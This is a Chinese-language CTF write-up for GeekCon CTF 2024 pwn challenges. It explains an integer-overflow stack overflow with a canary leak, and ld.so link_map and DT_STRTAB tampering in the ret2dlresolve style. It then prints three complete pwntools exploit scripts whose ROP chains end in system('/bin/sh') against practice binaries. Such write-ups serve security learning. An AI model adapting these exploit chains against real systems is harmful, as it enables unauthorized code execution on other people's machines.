---
title: 2024geekctf-PWN
id: 86338683-975a-4bf6-8767-267a21dbc28d
date: 2024-05-09 10:10:15
auther: yrl
cover: 
excerpt: 2024geekconctf -> memo0(init_array/换表base64) 换表base64，注意密文被动态解密过一次 2024geekconctf -> memo1(整数溢出->栈溢出) unsigned __int64 __fastcall edit(__int64 a1, uns
permalink: /archives/2024geekctf_wp
categories:
 - pwn-wp
tags: 
 - pwn
---

# 2024geekconctf -> memo0(init_array/换表base64)

换表base64，注意密文被动态解密过一次

# 2024geekconctf -> memo1(整数溢出->栈溢出)

```c
unsigned __int64 __fastcall edit(__int64 a1, unsigned int a2)
{
  __int64 v3; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("How many characters do you want to change:");
  __isoc99_scanf("%lld", &v3);
  if ( a2 > v3 )                                // numberover
  {
    readn(a1, v3);
    puts("Done!");
  }
  return v4 - __readfsqword(0x28u);
}
```

edit函数中读取v3类型为long long，随后与unsigned int idx进行有符号比较，最后转换为unsigned int 传入myread中。构造负数v3使其补码为想要的目标值即可达成栈溢出`-1*(~(len(payload) - 1)&0x7fffffffffffffff)`
这里通过多次溢出到canary低位进行覆盖(注意溢出对象在main栈帧中，只要main不退出，不影响main中泄露函数运行)，即可泄露，exp如下

```python
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
from pwn import*
import os

context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ["/usr/bin/tmux","sp","-h"])

def debug(mallocr):
	if len(sys.argv)!=1:
		return
	text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1].split(' ')[0], 16)
	gdb.attach(p, 'b *{}'.format(hex(text_base+mallocr)))
	pause()

def exp(host = "chall.geekctf.geekcon.top", port=40311, exe = "./memo1"):
  global p
  if len(sys.argv)==1:
    p = process(exe)
  else:
    p = remote(host, port)
  pass
  libb = ELF("/home/yrl/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6")
  
  poprdi = 0x000000000002a3e5
  poprsi = 0x000000000002be51
  poprdxrbx= 0x0000000000090529

  p.sendline("CTF_is_interesting_isn0t_it?")
  p.sendline("1")
  p.recv()
  p.sendline("a"*200)
  p.recv()

  p.sendline("3")
  p.recv()
  debug(0x184a)
  p.sendline(str(-1*(~(0x109 - 1)&0x7fffffffffffffff)).encode())
  p.sendline("a"*0x109)
  sleep(0.5)
  p.recvuntil(":")
  p.sendline("2")
  p.recvuntil("Content:\n")
  canary = p.recv()[0x112-9:0x119-9].rjust(8, b"\x00")
  canary = u64(canary)
  log.success(hex(canary))

  p.sendline("3")
  p.recv()
  p.sendline(str(-1*(~(0x118 - 1)&0x7fffffffffffffff)).encode())
  p.send("a"*0x118)
  sleep(0.5)
  p.recvuntil(":")
  p.sendline("2")
  p.recvuntil("Content:\n")
  libc = p.recv()[0x121-9:0x127-9].ljust(8, b"\x00")
  libc = u64(libc) - 0x29d90
  log.success(hex(libc))

  p.sendline("3")
  p.recv()
  p.sendline(str(-1*(~(0x128 - 1)&0x7fffffffffffffff)).encode())
  p.send("a"*0x128)
  p.recvuntil(":")
  p.sendline("2")
  p.recvuntil("Content:\n")
  pie = p.recv()[0x131-9:0x137-9].ljust(8, b"\x00")
  pie = u64(pie) - 0x1938
  log.success(hex(pie))

  p.sendline("3")
  p.recv()
  target = pie + 0x4000
  payload = b"a"*0x108 + p64(canary) + p64(1) + p64(libc + poprdi) + p64(0) + p64(libc + poprsi) + p64(target) + p64(libc + poprdxrbx) + p64(8) + p64(0) + p64(libc + libb.symbols['read']) + p64(libc + poprdi) + p64(target)+ p64(pie + 0x101a)+p64(libc + libb.symbols["system"])
  p.sendline(str(-1*(~(len(payload) - 1)&0x7fffffffffffffff)).encode())
  p.send(payload)
  p.recv()
  p.sendline("6")
  p.recv()
  p.send("/bin/sh\x00")
if __name__ == '__main__':
	exp()
	p.interactive()

```

## 2024geekconctf -> memo2(re2dlreslove)

```c
unsigned __int64 sign()
{
  int v1; // [rsp+1Ch] [rbp-24h] BYREF
  char src[24]; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Where would you like to sign(after the content): ");
  __isoc99_scanf("%u", &v1);
  if ( mmap_addr[v1] )
  {
    printf("You will overwrite some content: ");
    write(1, &mmap_addr[v1], 8uLL);             // anywhere leak
  }
  printf("Enter your name: ");
  readn((__int64)src, 0x50u);
  strncpy(&mmap_addr[v1], src, 0x10uLL);        // anywhere write
  return v3 - __readfsqword(0x28u);
}
```

sign功能只能使用一次，然后_exit退出，所以为了泄露地址等信息，然后ROP，我们需要多次sign的机会，sign中有一个任意地址读和任意地址写机会，且relro保护部分开启，这可以想到ret2dlreslove，泄露linkmap->l_addr后将其修改为其他函数（如alarm）就可实现多次使用sign

程序首先mmap了一块空间，sig函数对该空间的修改存在数组越界，而mmap分配的地址是相对偏移固定的，故我们可以修改到ld.so上的内容

dl_reslove解析函数时，会根据函数的符号沿着所有link_map查找相应符号，对于_exit，会在libc中查找。这个查找的结果是libc的link_map -> l_addr 加上函数的偏移，而我们调试发现这个地址在ld附近，故我们可以通过更改l_addr，使_exit被错误解析到其他函数上

不过这里即使错误解析_exit，也无法直接获得shell，并会在之后的return立即退出。还好我们还有一个栈溢出，通过覆盖canary，能够直接调用stack_chk_fail。如果我们错误解析stack_chk_fail这个函数，就能在避免canary错误退出的同时，获得一个可观的栈溢出

exp：
```python
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
from pwn import*
import os

context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ["/usr/bin/tmux","sp","-h"])

def debug(mallocr):
	if len(sys.argv)!=1:
		return
	text_base = int(os.popen("pmap {}| awk '{{print }}'".format(p.pid)).readlines()[1].split(' ')[0], 16)
	gdb.attach(p, 'b *{}'.format(hex(text_base+mallocr)))
	pause()

def exp(host = "0.0.0.0", port=40312, exe = "./memo2"):
  global p
  if len(sys.argv)==1:
    p = process("./memo2_2.35-3.7")
    libc = ELF('./libc.so.6')
  
  else:
    p = remote(host, port)
    libc = ELF('./libc.so.6')
  pass

  offset = 0x160
  libclinkmap = 0x22e260 # local ubuntu20.04(2.35-0ubuntu3.7) after patchelf
  # libclinkmap = 0x2160 # local docker env
  alarm_addr = libc.symbols['alarm']
  stack_chk_fail = libc.symbols['__stack_chk_fail']
  write = libc.symbols['write']
  poprdi = 0x000000000002a3e5
  binsu = next(libc.search(b'/bin/sh\x00'))
  system = libc.symbols['system']
  ret = poprdi + 1

  p.recvuntil(b"Please enter your password: ")
  p.sendline(b"CTF_is_interesting_isn0t_it?")

  p.recvuntil(b"Your choice:")
  p.sendline(b"5")
  p.recvuntil(b"Where would you like to sign(after the content): ")
  # debug(0x1a72)
  p.sendline(str(libclinkmap+1).encode())
  p.recvuntil(b"You will overwrite some content: ")
  libc = p.recvn(5).rjust(6, b"\x00").ljust(8, b"\x00")
  libc = u64(libc)
  log.success(f"[*]libc: {hex(libc)}")
  p.recvuntil(b"name: ")
  log.success(f"6666:{hex(stack_chk_fail)}")
  log.success(f"6666:{hex(alarm_addr)}")
  log.success(f"6666:{hex(stack_chk_fail - alarm_addr)}")
  log.success(f"6666:{hex(libc - (stack_chk_fail - alarm_addr))}")
  payload = p64(libc - (stack_chk_fail - alarm_addr))[1:]
  payload = payload.ljust(0x28, b"\x90")
  payload += p64(poprdi + libc) + p64(binsu + libc) + p64(ret + libc) +p64(system + libc)
  p.sendline(payload)
  
if __name__ == '__main__':
	exp()
	p.interactive()

```

方法二：

覆盖l_info[DT_STRTAB]指针指向fake strtab，修改__stack_chk_fail为unshare，过掉canary检测，然后进行libc的泄露和正常的ROP即可

步骤：
1. add功能构造fake strtab
2. sign功能输入偏移指向link_map->l_info[DT_STRTAB]， 修改l_info[DT_STRTAB].un_ptr为fake strtab，当reslove时会将__stack_chk_fail解析成unshare
3. 泄露libc
4. ROP劫持程序执行流到system

注意泄露时需要保证mmap地址低字节不能为0，需要错位进行泄露，所以会导致1字节爆破，概率1/16

exp：
```python
from pwn import *
from ctypes import *
from struct import pack
import numpy as np
import base64

p = process('./memo2')
# p = remote('0.0.0.0',40312)
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ["/usr/bin/tmux","sp","-h"]
# libc = ELF('./libc.so.6')
libc = ELF('/home/yrl/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')

p.recvuntil(b'password:')
p.sendline(b'CTF_is_interesting_isn0t_it?')

p.recvuntil(b'choice:')
p.sendline(b'1')
p.recvuntil(b'memo:\n')
p.sendline(b'a'*0x98 + b'unshare') # fake strtab

p.recvuntil(b'choice:')
p.sendline(b'5')
p.recvuntil(b'content')
# p.sendline(str(0x4000 + 0x3b2e0 + 0x68 + 2 - 0x10))
p.sendline(str(0x26a2e0+0x68-0x10+2))
p.recvuntil(b'content: ')
# 1/16
v = 0x8
# elf_base =  (u64(p.recv(8)) << 16) | (v << 12)
elf_base =  (u64(p.recv(4).ljust(8,b'\x00')) <<16) |(v << 12)
log.success(f'maybe elf base:{elf_base:#x}')

# overwite DT_STRTAB to fake strtab
payload = b'a'*0xe + p16(0x4128 + elf_base & 0xffff)
payload += p64(0)*3 + p64(elf_base + 0x1b10) + p64(elf_base + 0x1a19)
p.recvuntil(b'name: ')
p.sendline(payload)

# leak libc
p.recvuntil(b'content): ')
p.sendline(str(0x26a2f8))
p.recvuntil(b'content: ')
libc_base = u64(p.recv(8)) - 0x265890
log.success(f'libc_base:{libc_base:#x}')

# ROP to system
p.recvuntil(b'name: ')
# gdb.attach(p)
# pause()
payload = p64(0)*5 + p64(libc_base + 0x2a3e5)
payload += p64(libc_base +next(libc.search(b'/bin/sh\x00')))
payload += p64(elf_base + 0x1b10) + p64(libc_base + libc.symbols['system'])
p.sendline(payload)

p.interactive()
```

## 2024geekconctf -> shellcode(限制的shellcode)

参见[特殊shellcode总结_2024GeekCTF -> shellcode](https://d1ag0n.top/archives/%E6%9C%89%E5%85%B3%E7%89%B9%E6%AE%8Ashellcode%E7%9A%84%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93)

## 附件

[附件](https://github.com/D1ag0n-Young/IMG/tree/master/Pwn/2024geekctf)